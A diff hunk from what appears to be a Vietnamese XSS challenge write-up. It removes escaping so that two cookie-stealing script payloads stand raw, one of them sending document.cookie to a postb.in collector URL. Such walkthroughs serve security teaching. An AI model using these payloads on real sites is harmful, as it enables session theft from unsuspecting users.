@@ -592,11 +592,11 @@ Bước 1: Đầu tiên ta thử để chắc rằng trang này bị xss : <scri
 
 Bước 2: Việc của ta bây giờ là đi chôm cookie :3, mình xài payload sau:
 
-> \<script>document.write("<img src='your_link/"+document.cookie+"'>");</script>\
+> <script>document.write("<img src='your_link/"+document.cookie+"'>");</script>
 
 Bước 3: Để nhận request, mình sử dụng trang postb.in
 
-> \<script>document.write("<img src='https://postb.in/1636121993357-5448687351308/"+document.cookie+"'>");</script>\
+> <script>document.write("<img src='https://postb.in/1636121993357-5448687351308/"+document.cookie+"'>");</script>
 
 > ![image](https://user-images.githubusercontent.com/90112096/140525437-6402649e-bbb5-4e67-8bc3-37553086b207.png)
 
